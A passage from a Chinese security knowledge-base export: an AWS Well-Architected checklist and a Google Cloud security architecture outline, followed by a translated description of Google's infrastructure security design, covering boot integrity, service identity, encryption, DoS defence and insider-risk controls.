如何监控你的存储系统来保证其性能？\r\n    - 如何确保存储的容量满足你的业务需求？\r\n  - 数据库（Database）\r\n    - 如何选择适合你系统的数据库方案？\r\n    - 如何保证当新的数据库方案发布的时候你用哪一种数据库最合适？\r\n    - 如何监控数据库保证其性能达到要求？\r\n    - 如何保证数据库的容量和吞吐量可以满足业务需求？\r\n  - 网络（Network）\r\n    - 如何选择合适的网络方案？\r\n    - 如何保证新的网络技术出现的时候你使用哪一种网络方案最合适？\r\n    - 如何监控你的网络保证其性能？\r\n    - 如何确保网络性能满足业务需求？\r\n- 成本优化\r\n  - 成本效率高的资源\r\n    - 如何选择合适的资源类型来满足支出需求？\r\n    - 如何选择合适的收费模式来满足支出需求？（按需实例，预留实例和竞价实例）\r\n    - 是否有其他服务来代替现有的服务可以增加你的投资回报率？（比如用S3静态网站代替EC2，Lambda代替EC2等）\r\n  - 供需匹配\r\n    - 如何确保你的容量满足你的需求又不会超出需求太多？\r\n    - 如何优化对AWS服务的使用？\r\n  - 支出认知\r\n    - 使用哪一些访问控制和流程来控制AWS的费用？\r\n    - 如何监控我们的AWS用量和费用？\r\n    - 如何将我们不使用的资源给关闭？\r\n    - 如何在设计架构的时候考虑数据传输的费用？\r\n  - 不断优化\r\n    - 我们如何管理和考虑使用更新的服务？\r\n- 卓越操作\r\n  - 筹备（Preparation）\r\n    - 你使用的云操作流程有什么最佳实践？\r\n    - 你如何进行配置管理？\r\n  - 操作（Operation）\r\n    - 如何在最小变更影响的情况下对的你业务系统进行变革？\r\n    - 如何监控你的系统来保证它可以按预期一样运行？\r\n  - 演进（Response）\r\n    - 如何处理意料之外的运营事件？\r\n    - 在处理意料之外的事件的时候有什么事件升级的流程？\r\n\r\n# 一般性设计原则\r\n\r\n良好架构框架定义了一系列一般性设计原则，包括了：\r\n\r\n- ![X9ITiT](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/X9ITiT.jpg)\r\n\r\n- **不需再猜测您的容量需求:** 在以往的基础架构部署中，我们往往面临着高成本闲置的资源或者资源容量紧张导致业绩受损的情况。利用云计算，这个问题可以得到解决。你可以先尽可能使用较少的容量，然后在后期根据需求进行随意伸缩。\r\n- **以生产规模进行系统测试:** 我们可以在云环境中轻松搭建与生产环境1:1的测试环境，在做完一系列测试之后清空这些资源，同时只为使用的资源和时间而付费。这在传统基础架构环境中是无法轻松达到的。我们可以如之前实验所示，使用CloudFormation在半小时内搭建一套复杂的基础架构，并且在使用完毕后将其完全删除。\r\n- **自动简化架构实验:** 在云计算环境中，自动化可以帮助我们降低成本以及手动操作带来的种种投入。我们可以使用CloudTrail追踪各种变更、审计相关的影响并且在必要时进行恢复。我们也可以使用例如Lambda函数来进行大量自动化的工作。\r\n- **允许实现架构演进:** 在传统环境中，对应用程序架构的变更周期非常长。想象一下我们使用ITIL对系统生命周期进行管理，随着业务的发展，我们的架构可能无法适应不断变化的业务需求，但是更改系统的风险非常高。在云计算的环境中，我们可以巧妙利用自动化、DevOps、IaaC (Infrastrature as a Code)的特性来对架构进行更快速的迭代，实现敏捷开发（Agile）。\r\n- **数据驱动型架构:** 在云环境中，你可以通过CloudWatch收集相关数据，来了解你的架构负载情况。你的云基础架构以代码的形式存在，因此可以利用这些数据来改善你的架构。\r\n- **通过模拟促销日实现改进:** 通过模拟例如淘宝双11，京东618等促销日的大型流量，来改进架构中的不足之处，并且积累应对的经验和方案 。\r\n\r\n# 参考资料\r\n\r\n- [https://aws.amazon.com/cn/architecture/well-architected/](https://aws.amazon.com/cn/architecture/well-architected/)\r\n- [http://www.cloudbin.cn/?p=2834](http://www.cloudbin.cn/?p=2834)"},{"fields":{"slug":"/安全知识库/行业观察/Google/Google Cloud 安全架构/","title":"Google Cloud 安全架构"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Google Cloud 安全架构\r\ntags:\r\n- 行业观察\r\n- Google\r\n- 安全架构\r\n---\r\n\r\n# 1. 安全合规要求\r\n\r\n满足全球不同国家地区的法律、规章制度、标准。\r\n\r\n![DJFWXD](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/DJFWXD.jpg)\r\n\r\n# 2. 安全架构模型\r\n\r\n基本上就是参考了NIST CSF和CIS Control，中规中矩。\r\n\r\n![kNboy6](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/kNboy6.jpg)\r\n\r\n![itBqm3](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/itBqm3.jpg)\r\n\r\n# 3. Google Cloud 在安全上做了什么？\r\n\r\n当组织开始在云中构建 IT 基础架构时，会考虑以下几个基本安全组件来建立环境。\r\n\r\n![SGvGUN](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/SGvGUN.jpg)\r\n\r\n![yTjHqc](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/yTjHqc.jpg)\r\n\r\n\r\n\r\n具体如下：\r\n\r\n​\t1. **安全治理 Governance**：定义了安全架构路线图，以及如何管理和遵循各种标准和过程以确保环境安全稳定；最好是遵循或参考NIST等业界标准化框架；同时也包含了风险管理（定义成本、了解风险、努力减轻这些风险）和安全人员培训。\r\n\r\n​\t2. **DevSecOps**：融入DevOps流程，理解要部署的应用/Workload，在漏洞产生前就消灭他们。\r\n\r\n​\t3. **IAM**：强大的 IAM 工具和流程将是您构建经过身份验证和授权的环境的第一道防线。\r\n\r\n​\t4. **网络安全**：在将数据中心传统迁移到云端的过程中，应用程序和工具通常可能对外暴露访问，需要使用包括隔离、VPC控制、云防火墙、DDoS防护等来进行防护。\r\n\r\n​\t5. **计算和基础设施安全**：提供包括云原生监控和日志服务等多个方面能力。默认情况下，它的各种底层组件（如 Monitoring、Trace、Logging、Error Reporting 和 Debug）提供了整个 GCP 基础架构的实时可见性。\r\n\r\n​\t6. **应用程序安全**：需要紧急预防或缓解 OWASP Top 10 等威胁，使用包括扫描器、WAF等手段。\r\n\r\n​\t7. **数据安全**：防止数据泄露是整个安全基础设施和流程的基石。大多数在云中构建的数据库现在都带有本机安全控制，具有授权视图和列级安全等功能，应用程序可以配置为利用这些控制进行授权访问。\r\n\r\n​\t8. **用户终端和连接安全性**：利用其庞大的内部网络将公司网络保持在内部网络中，避免不必要的暴露。\r\n\r\n# 4. 数据和事件驱动架构\r\n\r\n保护运行环境的推荐架构之一是密切关注数据和事件，并努力补救或提醒适当的团队。\r\n\r\n![QLEWAH](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/QLEWAH.jpg)\r\n\r\n# 5. 安全组件概览\r\n\r\n![10n9t3](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/10n9t3.jpg)\r\n\r\n# 6. 参考\r\n\r\n- [https://info-on-security.medium.com/gcp-security-architecture-whitepaper-da19fc9b4ba2](https://info-on-security.medium.com/gcp-security-architecture-whitepaper-da19fc9b4ba2)\r\n- [https://www.youtube.com/watch?v=LZyhEEC7jcg&t=2316s](https://www.youtube.com/watch?v=LZyhEEC7jcg&t=2316s)"},{"fields":{"slug":"/安全知识库/行业观察/Google/Google 基础设施安全设计/","title":"Google 基础设施安全设计"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Google 基础设施安全设计\r\ntags:\r\n- 行业观察\r\n- Google\r\n- 系统设计\r\n---\r\n\r\n# 简介\r\n\r\n本文档概要介绍了 Google 的技术基础架构如何从设计层面实现原生安全性，这些内容面向安全高管、安全架构师和审核人员。\r\n\r\n本文档介绍了以下内容：\r\n\r\n- Google 的全球技术基础架构，旨在令 Google 能够在整个信息处理周期中提供安全保障。此基础架构可帮助实现以下目的：\r\n  - 安全地部署服务\r\n  - 通过最终用户的隐私保护措施安全地存储数据\r\n  - 保障服务之间的通信安全\r\n  - 通过互联网安全且私密地与客户交流\r\n  - Google 工程师进行安全运营\r\n- 我们如何使用此基础架构构建互联网服务，包括 Google 搜索、Gmail 和 Google 相册等个人用户服务以及 Google Workspace 和 Google Cloud 等企业服务。\r\n- 我们在确保基础架构和运营安全方面的投资。Google 有许多致力于安全与隐私保护的工程师，其中许多人是公认的业界权威。\r\n- Google 的安全产品和服务，这些产品和服务是为满足我们自身的安全需求在内部进行创新而产生的成果。例如，[BeyondCorp](https://cloud.google.com/beyondcorp?hl=zh-cn) 是我们在内部实现[零信任安全模型](https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-january-2022?hl=zh-cn)的直接成果。\r\n- 如何逐层设计基础架构的安全机制。这些安全层包括：\r\n  - [底层基础架构](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#secure-low-level)\r\n  - [服务部署](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#secure-service)\r\n  - [数据存储](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#secure-data)\r\n  - [互联网通信](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#secure-internet)\r\n  - [运维](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#operational-security)\r\n\r\n本文档的后续部分将介绍这些安全层。\r\n\r\n# 安全的底层基础架构\r\n\r\n本部分介绍如何保护数据中心的实体场所、数据中心的硬件以及硬件上运行的软件栈。\r\n\r\n## 实体场所的安全性\r\n\r\n我们设计和建造了自己的数据中心，其中加入了多层物理安全保护措施。对这些数据中心的访问受到严格控制。我们使用多个物理安全层来保护数据中心场地，包括生物识别、金属检测、摄像头、车辆栏障和激光入侵检测系统。如需了解详情，请参阅[数据中心安全性](https://www.google.com/about/datacenters/data-security/?hl=zh-cn)。\r\n\r\n我们还在第三方数据中心托管了一些服务器。在这些数据中心里，除了数据中心运营商提供的安全层之外，我们还确保落实由 Google 管控的物理安全措施。例如，我们运行独立于数据中心运营商安全层的生物识别系统、摄像头和金属探测器。\r\n\r\n## 硬件的设计和来源\r\n\r\nGoogle 的每个数据中心都有数千台服务器与本地网络相连。我们设计服务器主板和网络设备，对合作的组件供应商进行审核，并谨慎选择组件。我们与供应商合作，对组件提供的安全属性进行审核和验证。我们还设计专门的芯片，包括我们在服务器、设备和外围设备上部署的硬件安全芯片（称为 [Titan](https://cloud.google.com/blog/products/identity-security/titan-in-depth-security-in-plaintext?hl=zh-cn)）。这些芯片可使我们在硬件级别对正规的 Google 设备进行识别和身份验证，并充当硬件信任根。\r\n\r\n**注意**：Titan 硬件芯片的变体也用于 [Pixel 设备](https://safety.google/pixel/?hl=zh-cn#security-by-design)和 [Titan 安全密钥](https://cloud.google.com/titan-security-key?hl=zh-cn)。\r\n\r\n## 安全启动栈和机器身份标识\r\n\r\nGoogle 服务器利用各种技术来确保启动正确的软件栈。我们对基板管理控制器 (BMC)、BIOS、引导加载程序、内核和基础操作系统映像等底层组件使用加密签名。可以在每次启动或更新期间对这些签名进行验证。Google 服务器的第一个完整性检查使用硬件信任根。这些组件由 Google 控制和构建，并通过完整性证明进行强化。对于每一代新硬件，我们都致力于不断提高安全性。例如，根据服务器设计的代次，启动链的信任根在以下某个组件中：\r\n\r\n- Titan 硬件芯片\r\n- 可锁定的固件芯片\r\n- 运行我们自己的安全代码的微控制器\r\n\r\n数据中心的每个服务器都有唯一的身份标识。可以将这一身份标识与硬件信任根以及机器启动所用的软件相关联。此身份标识用于对机器上的底层管理服务之间的 API 调用进行身份验证。此身份标识也用于双向服务器身份验证和传输加密。我们开发了[应用层传输安全 (ALTS)](https://cloud.google.com/docs/security/encryption-in-transit/application-layer-transport-security?hl=zh-cn) 系统，用于保护基础架构中的远程过程调用 (RPC) 通信的安全。如果发生安全突发事件，可以集中撤消这些机器身份标识。此外，它们的证书和密钥会定期轮替，旧的证书和密钥会被撤消。\r\n\r\n我们开发了自动化系统来执行以下任务：\r\n\r\n- 确保服务器运行其软件栈的最新版本（包括安全补丁）。\r\n- 检测和诊断硬件和软件问题。\r\n- 使用启动时验证和隐式证明确保机器和外围设备的完整性。\r\n- 确保只有运行指定软件和固件的机器才能访问使其可在生产网络中进行通信的凭据。\r\n- 当不再需要机器时，在服务中移除或重新分配机器。\r\n\r\n# 安全的服务部署\r\n\r\nGoogle 服务是由我们的开发者编写并在我们的基础架构上运行的应用二进制文件。Google 服务的示例包括 Gmail 服务器、Spanner 数据库、Cloud Storage 服务器、YouTube 视频转码器和运行客户应用的 Compute Engine 虚拟机。为了处理所需规模的工作负载，可能会有数千台机器运行同一服务的二进制文件。集群编排服务（称为 [Borg](https://research.google/pubs/pub43438/?hl=zh-cn)）控制直接在基础架构上运行的服务。\r\n\r\n基础架构假定基础架构上运行的服务之间不存在任何信任。此信任模型称为“零信任安全模型”。零信任安全模型意味着在默认情况下不信任任何设备或用户，无论它们是位于网络内部还是外部。\r\n\r\n由于基础架构设计为多租户，因此客户的数据（个人用户、企业，甚至我们自己的数据）分布在整个共享基础架构中。此基础架构由数以万计的同构机器组成。除特定情况外（例如，使用 Google Cloud 在[Compute Engine 的单租户节点](https://cloud.google.com/compute/docs/nodes/sole-tenant-nodes?hl=zh-cn)上预配虚拟机），基础架构不会将客户数据隔离到单个机器或一组机器中。\r\n\r\nGoogle Cloud 和 Google Workspace 支持有关数据驻留的监管要求。如需详细了解数据驻留和 Google Cloud，请参阅[实现数据驻留和主权要求](https://cloud.google.com/architecture/framework/security/data-residency-sovereignty?hl=zh-cn)。如需详细了解数据驻留和 Google Workspace，请参阅[数据区域：选择数据的地理位置](https://support.google.com/a/answer/7630496?hl=zh-cn)。\r\n\r\n## 服务身份标识、完整性与隔离\r\n\r\n为了实现服务间通信，应用使用加密的身份验证和授权。身份验证和授权以管理员和服务可以理解的抽象级别和粒度提供强大的访问权限控制。\r\n\r\n服务不依赖内部网络分段或防火墙作为主要安全机制。我们网络中各处的入站流量和出站流量过滤可帮助防止 IP 欺骗。这种方法还有助于我们最大限度地提高网络的性能和可用性。对于 Google Cloud，您可以添加其他安全机制，例如 [VPC Service Controls](https://cloud.google.com/vpc-service-controls/docs/overview?hl=zh-cn) 和 [Cloud Interconnect](https://cloud.google.com/network-connectivity/docs/interconnect/concepts/overview?hl=zh-cn)。\r\n\r\n在基础架构上运行的每个服务都具有关联的服务帐号身份标识。服务会获得加密凭据，可用于在发出或接收 RPC 时向其他服务证明其身份。这些身份在安全政策中使用。安全政策可确保客户端与预期服务器通信，并且服务器限制特定客户端可以访问的方法和数据。\r\n\r\n我们使用各种隔离和沙盒技术来保护服务免受同一机器上运行的其他服务的影响。这些技术包括 Linux 用户分离、基于语言（如 [Sandboxed API](https://developers.google.com/code-sandboxing/sandboxed-api?hl=zh-cn)）和基于内核的沙盒、容器应用内核（如 [gVisor](https://gvisor.dev/)）和硬件虚拟化。一般来说，我们会为风险较高的工作负载使用更多的隔离层。风险较高的工作负载包括用户提供的需要进行额外处理的内容。例如，风险较高的工作负载包括针对用户提供的数据运行复杂的文件转换器，或者为 App Engine 或 Compute Engine 等产品运行用户提供的代码。\r\n\r\n为了提高安全性，敏感服务（例如集群编排服务和某些密钥管理服务）只在专用机器上运行。\r\n\r\n在 Google Cloud 中，为了为您的工作负载提供更强的加密隔离以及保护使用中的数据，我们支持 Compute Engine 虚拟机和 Google Kubernetes Engine (GKE) 节点使用[机密计算](https://cloud.google.com/confidential-computing?hl=zh-cn)服务。\r\n\r\n## 服务间访问管理\r\n\r\n服务的所有者可以利用基础架构提供的访问管理功能来精确指定其服务可以与其他哪些服务进行通信。例如，一个服务可以将传入 RPC 限制为一组允许的其他服务。在这种情况下，可以使用服务身份许可名单配置该服务，基础架构会自动执行此访问限制。执行包括审核日志记录、理由以及单方面访问限制（例如，针对工程师请求）。\r\n\r\n需要访问服务的 Google 工程师也会获得个人身份标识。可以将服务配置为根据身份标识允许或拒绝访问。所有这些身份标识（机器、服务和员工）都位于基础架构维护的全局命名空间中。\r\n\r\n为管理这些身份标识，基础架构提供了一个工作流系统，其中包括批准链、日志记录和通知。例如，安全政策可以执行多方授权。此系统使用双人规则，确保一个工程师必须先获得另一个授权工程师的批准才能独自执行敏感操作。借助这一系统，可以将安全访问管理流程扩展到基础架构上运行的数千个服务。\r\n\r\n基础架构还为服务提供用户、群组和成员资格管理的规范化服务，可以在必要时实现精细的自定义访问权限控制。\r\n\r\n如 [Google Workspace 中的最终用户数据访问管理](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#access-management-of-end-user-data-in-google-workspace)中所述，最终用户身份标识是单独管理的。\r\n\r\n## 服务间通信的加密\r\n\r\n基础架构可确保网络上的 RPC 数据的机密性和完整性。所有 Google Cloud 虚拟网络流量均经过加密。基础架构服务之间的所有通信都经过身份验证，大多数服务间通信均已加密，这增加了一层额外的安全保护，即使网络被窃听或网络设备遭到破解，也能保护通信。服务间通信加密要求的例外情况仅授予延迟要求低的流量，并且这也不会在数据中心的多个物理安全层中留下单个网络结构。\r\n\r\n基础架构可自动、高效地（借助硬件分流）为数据中心之间通过网络传输的基础架构 RPC 流量提供端到端加密。\r\n\r\n## Google Workspace 中的最终用户数据访问管理\r\n\r\n我们编写了一个典型的 Google Workspace 服务来代表最终用户执行某些操作。例如，最终用户可以将电子邮件存储在 Gmail 上。最终用户与 Gmail 等应用的互动可能会涉及到基础架构内的其他服务。例如，Gmail 可能会调用 People API 以访问最终用户的通讯簿。\r\n\r\n[服务间通信的加密](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#encryption-inter-service)介绍了如何将某个服务（例如 Google 通讯录）设计为保护来自另一个服务（例如 Gmail）的 RPC 请求。但是，这一访问权限控制级别仍然是一组广泛的权限，因为 Gmail 可以随时请求任何用户的联系人。\r\n\r\n当 Gmail 代表最终用户向 Google 通讯录发送 RPC 请求时，基础架构允许 Gmail 在 RPC 请求中提供最终用户权限票证。此票证可证明 Gmail 代表该特定最终用户发出 RPC 请求。Google 通讯录通过票证实现安全保护措施，从而仅返回票证中指定的最终用户的数据。\r\n\r\n基础架构提供了一项中央用户身份识别服务，该服务可以颁发上述最终用户权限票证。身份识别服务验证最终用户登录，然后向用户的设备颁发用户凭据，例如 Cookie 或 OAuth 令牌。从该设备发送到我们的基础架构的每个后续请求都必须提供该最终用户凭据。\r\n\r\n当某个服务收到最终用户凭据时，会将该凭据传递给身份识别服务进行验证。如果最终用户凭据通过验证，身份识别服务会返回一个短期有效的最终用户权限票证，该票证可用于与该用户的请求相关的 RPC。在我们的示例中，获得最终用户权限票证的服务是 Gmail，Gmail 将票证传递给 Google 通讯录。之后，对于任何级联调用，调用服务都可以将最终用户权限票证作为 RPC 的一部分发送给被调用方。\r\n\r\n下图展示了服务 A 和服务 B 的通信方式。基础架构可提供服务身份、自动身份互验、服务间通信加密，并可执行服务所有者定义的访问政策。每项服务都有一个由服务所有者创建的服务配置。对于加密的服务间通信，自动双向身份验证使用调用方和被调用方身份标识。只有在访问规则配置允许的情况下才能进行通信。\r\n\r\n![展示服务 A 和服务 B 通信方式的图表。](https://cloud.google.com/static/docs/security/infrastructure/design/resources/google-infrastructure-interservice-comm.svg?hl=zh-cn)\r\n\r\n如需了解 Google Cloud 中的访问管理，请参阅 [IAM 概览](https://cloud.google.com/iam/docs/overview?hl=zh-cn)。\r\n\r\n# 安全的数据存储\r\n\r\n本部分介绍如何保证存储在基础架构上的数据的安全。\r\n\r\n## 静态加密\r\n\r\nGoogle 的基础架构提供各种存储服务和分布式文件系统（例如 Spanner 和 [Colossus](https://cloud.google.com/blog/products/storage-data-transfer/a-peek-behind-colossus-googles-file-system?hl=zh-cn)）以及一个中央密钥管理服务。Google 的应用使用存储基础架构访问物理存储。我们使用多层加密来保护静态数据。默认情况下，存储基础架构会在用户数据写入物理存储空间之前加密所有用户数据。\r\n\r\n基础架构在应用层或存储基础架构层执行加密。加密可使基础架构将其自身与底层存储上的潜在威胁（例如恶意磁盘固件）隔离开来。在可能的情况下，我们还会在硬盘和固态硬盘中启用硬件加密支持，并在每个硬盘的整个生命周期内细致地进行跟踪。对于退役的加密存储设备，我们先通过多步骤流程（包括两次独立验证）清空其内容，然后才会将其在物理上撤离我们的管控范围。对于未经历此清理过程的设备，我们会在现场进行物理销毁（即粉碎）。\r\n\r\n除了基础架构进行的加密以外，Google Cloud 和 Google Workspace 还提供密钥管理服务。对于 Google Cloud，您可以使用 [Cloud KMS](https://cloud.google.com/docs/security/key-management-deep-dive?hl=zh-cn)，它是一种允许客户管理加密密钥的云服务。对于 Google Workspace，您可以使用客户端加密功能。如需了解详情，请参阅 [Google Workspace 中的客户端加密功能和增强型协作工具](https://cloud.google.com/blog/products/workspace/new-google-workspace-security-features?hl=zh-cn)。\r\n\r\n## 数据删除\r\n\r\n数据删除流程通常是从将具体数据标记为“已安排删除”开始，而不是真正的删除数据。借助此方法，我们可以恢复无意间删除的数据，例如由客户发起的删除、bug 导致的删除或内部流程错误导致的删除。数据标记为“已安排删除”后，系统会根据特定于服务的政策来删除数据。\r\n\r\n当最终用户删除其帐号时，基础架构会通知处理最终用户数据的服务该帐号已被删除。然后，这些服务便会安排删除与被删除的最终用户帐号相关联的数据。此功能使最终用户能够控制自己的数据。\r\n\r\n如需了解详情，请参阅 [Google Cloud 上的数据删除](https://cloud.google.com/docs/security/deletion?hl=zh-cn)。\r\n\r\n# 安全的互联网通信\r\n\r\n本部分介绍我们如何保护互联网与 Google 基础架构上运行的服务之间的通信。\r\n\r\n如[硬件的设计和来源](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#hardware-design)中所述，基础架构由许多通过 LAN 和 WAN 互连的物理机器组成。服务间通信的安全性不依赖于网络安全。但是，我们将基础架构从互联网隔离到专用 IP 地址空间。我们只会将部分机器直接暴露给外部互联网流量，从而可以实现额外的保护，例如防御拒绝服务 (DoS) 攻击。\r\n\r\n## Google Front End 服务\r\n\r\n当某个服务需要在互联网上可用时，它可向名为 Google Front End (GFE) 的基础架构服务注册。通过使用正确的证书并遵循最佳实践（例如支持完全正向加密），GFE 可确保终结全部 TLS 连接。GFE 还会应用保护措施来防御 DoS 攻击。然后，GFE 利用 [Google Workspace 中的最终用户数据访问管理](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#access-management-of-end-user-data-in-google-workspace)中讨论的 RPC 安全协议转发对该服务的请求。\r\n\r\n实际上，任何必须向外发布的内部服务都使用 GFE 作为智能反向代理前端。GFE 提供其公共 DNS 名称的公共 IP 地址托管、DoS 保护和 TLS 终结。GFE 与其他任何服务一样在基础架构上运行并能够根据入站请求量进行调节。\r\n\r\nGoogle Cloud 上的客户虚拟机不向 GFE 注册，而是向 Cloud Front End 注册，Cloud Front End 是使用 Compute Engine 网络堆栈的特殊 GFE 配置。借助 Cloud Front End，客户虚拟机可以使用其公共或专用 IP 地址直接访问 Google 服务。（只有在启用[专用 Google 访问通道](https://cloud.google.com/vpc/docs/private-google-access?hl=zh-cn)后才能使用专用 IP 地址。）\r\n\r\n## DoS 防护\r\n\r\n我们的基础架构规模庞大，能够抵御许多 DoS 攻击。为了进一步降低 DoS 对服务的影响，我们设置了多层级 DoS 防护。\r\n\r\n当我们的光纤骨干网向我们其中一个数据中心传送外部连接时，该连接会经过多层硬件和软件负载均衡器。这些负载均衡器会将有关入站流量的信息报告给在基础架构上运行的中央 DoS 服务。当中央 DoS 服务检测到 DoS 攻击时，该服务可以配置负载均衡器，以降低或限制与攻击相关的流量。\r\n\r\nGFE 实例还会将它们正在接收的请求的相关信息报告给中央 DoS 服务，包括负载均衡器无权访问的应用层信息。然后，中央 DoS 服务便可以配置 GFE 实例，以降低或限制攻击流量。\r\n\r\n## 用户身份验证\r\n\r\n在 DoS 防护之后，安全通信的下一层防御来自中央身份识别服务。最终用户通过 Google 登录页面与此服务交互。该服务要求提供用户名和密码，还可以根据风险因素要求用户提供其他信息。风险因素示例包括用户过去是否从同一设备或类似位置登录过。在对用户进行身份验证之后，身份识别服务会颁发 Cookie 和 OAuth 令牌等凭据，供后续调用时使用。\r\n\r\n用户登录时，他们可以使用第二重身份验证，例如动态密码或防钓鱼安全密钥（例如 [Titan 安全密钥](https://cloud.google.com/titan-security-key?hl=zh-cn)）。Titan 安全密钥是支持 [FIDO Universal 2nd Factor (U2F)](https://en.wikipedia.org/wiki/Universal_2nd_Factor) 的物理令牌。我们与 FIDO Alliance 协作开发 U2F 开放标准。大多数网络平台和浏览器都采用此开放身份验证标准。\r\n\r\n# 运营安全\r\n\r\n本部分介绍我们如何开发基础架构软件，保护员工的机器及凭据，以及防范来自内部人员和外部攻击者的基础架构威胁。\r\n\r\n## 安全的软件开发\r\n\r\n除了前面介绍的[源代码控制保护机制和双方审核流程](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#secure-service)之外，我们还使用库来防止开发者引入某些安全 bug。例如，我们拥有可帮助 Web 应用避免 XSS 漏洞的库和框架，我们还使用模糊测试工具、静态分析工具和网络安全扫描工具等自动化工具来自动检测安全 bug。\r\n\r\n我们会进行人工安全审核以作为最终检查，审核范围从对较低风险的功能进行快速分类，到对最高风险的功能在设计和实施上进行深入审核。执行这些审核的团队包括网络安全、加密和操作系统安全领域的专家。这些审核可以帮助我们开发新的安全库功能和新的模糊测试工具，从而用于未来的产品。\r\n\r\n此外，我们还实施了[漏洞奖励计划](https://www.google.com/about/appsecurity/reward-program/?hl=zh-cn)，对发现并报告我们基础架构或应用中的 bug 的任何人士进行奖励。如需详细了解此计划，包括我们提供的奖励，请查看 [Bug Hunters 关键数据](https://bughunters.google.com/about/key-stats?hl=zh-cn)。\r\n\r\n此外，我们还致力于发现我们使用的开源软件的零日漏洞和其他安全问题。我们的 [Project Zero](https://googleprojectzero.blogspot.com/) 团队由 Google 研究人员组成，他们专门研究包括 [Spectre 和 Meltdown](https://googleprojectzero.blogspot.com/search?q=spectre) 在内的零日漏洞。我们是为 Linux KVM Hypervisor 提交最多 CVE 和安全 bug 修复的公司。\r\n\r\n## 源代码保护\r\n\r\n我们的源代码存储在具有内置源完整性和治理的代码库中，可以在其中审核服务的当前版本和过去版本。基础架构要求服务的二进制文件基于经过审核、登记和测试的特定源代码构建。[Binary Authorization for Borg (BAB)](https://cloud.google.com/docs/security/binary-authorization-for-borg?hl=zh-cn) 是部署服务时进行的内部强制执行检查。BAB 发挥以下作用：\r\n\r\n- 确保 Google 上部署的生产软件和配置经过审核和授权，尤其是在代码可以访问用户数据时。\r\n- 确保代码和配置部署满足特定的最低标准。\r\n- 防止内部人员或攻击者恶意修改源代码，并实现从服务回溯到其源代码的取证跟踪。\r\n\r\n## 确保员工设备及凭据的安全\r\n\r\n我们实施保护措施，使员工的设备和凭据免遭破解。为了帮助员工防范复杂的网上诱骗活动，我们强制使用与 U2F 兼容的安全密钥来取代动态密码双重身份验证。\r\n\r\n我们监控员工用于运行基础架构的客户端设备。我们确保设备的操作系统映像具有最新的安全补丁，并且控制员工可以在其设备上安装的应用。我们还利用系统来扫描用户安装的应用、下载项、浏览器扩展程序和网络浏览器内容，以确定它们是否适合企业设备。\r\n\r\n连接到企业 LAN 不是我们用于决定授予访问权限的主要机制。我们使用零信任安全性来保护员工对资源的访问。仅当员工使用受管设备并从指定网络和地理位置连接时，应用级别的访问管理控制机制才会向员工公开内部应用。客户端设备基于颁发给具体机器的证书以及关于其配置的断言（例如最新软件）获得信任。如需了解详情，请参阅 [BeyondCorp](https://cloud.google.com/beyondcorp?hl=zh-cn)。\r\n\r\n## 降低来自内部人员的风险\r\n\r\n我们限制并主动监控拥有基础架构管理员权限的员工的活动。通过持续的努力，我们不再需要针对特定任务授予特别访问权限，而是能够以安全可控的方式自动完成同样的任务。例如，对于某些操作我们要求双方批准，以及我们可以使用有限的 API 在不暴露敏感信息的情况下进行调试。\r\n\r\nGoogle 员工对最终用户信息的访问情况可通过底层基础架构钩子进行记录。我们的安全团队会监控访问模式并调查异常事件。\r\n\r\n## 威胁监控\r\n\r\nGoogle 的[威胁分析小组](https://blog.google/threat-analysis-group/?hl=zh-cn)会监控威胁发起者及其策略和技术的演变。这个小组的目标是提高 Google 产品的安全性，并向在线社区共享这些情报。\r\n\r\n对于 Google Cloud，您可以使用 [Google Cloud Threat Intelligence for Chronicle](https://chronicle.security/products/uppercase/) 和 [VirusTotal](https://support.virustotal.com/hc/en-us/categories/360000162878-Documentation) 来监控和应对多种类型的恶意软件。Google Cloud Threat Intelligence for Chronicle 是一个威胁研究团队，研究人员开发用于 [Chronicle](https://cloud.google.com/chronicle/docs/overview?hl=zh-cn) 的威胁情报。VirusTotal 是一个恶意软件数据库和可视化解决方案，您可以通过它更好地了解恶意软件在您企业中的运行方式。\r\n\r\n如需详细了解我们的威胁监控活动，请参阅[威胁情报报告](https://cloud.google.com/blog/products/identity-security/coin-mining-ransomware-apts-target-cloud-gcat-report?hl=zh-cn)。\r\n\r\n## 入侵检测\r\n\r\n我们使用复杂的数据处理流水线来集成各个设备上基于主机的信号、来自基础架构中各个监控点的基于网络的信号，以及来自基础架构服务的信号。构建于这些流水线之上的规则和机器智能会向运营安全工程师发出潜在突发事件警告。[我们的调查和突发事件响应团队](https://cloud.google.com/docs/security/incident-response?hl=zh-cn)会一年 365 天、一天 24 小时全天候地对这些潜在突发事件进行分类、调查和响应。我们效仿 [Red Team](https://en.wikipedia.org/wiki/Red_team) 的做法来衡量和改善我们的检测与响应机制的有效性。\r\n\r\n# 后续步骤\r\n\r\n- 如需详细了解我们如何保护我们的基础架构，请参阅[《构建安全可靠的系统》（O'Reilly 书籍）](https://www.oreilly.com/library/view/building-secure-and/9781492083115/)。\r\n- 详细了解[数据中心安全性](https://www.google.com/about/datacenters/data-security/?hl=zh-cn)。\r\n- 详细了解我们如何防范 [DDoS 攻击](https://cloud.google.com/blog/products/identity-security/identifying-and-protecting-against-the-largest-ddos-attacks?hl=zh-cn)。\r\n- 了解我们的零信任解决方案 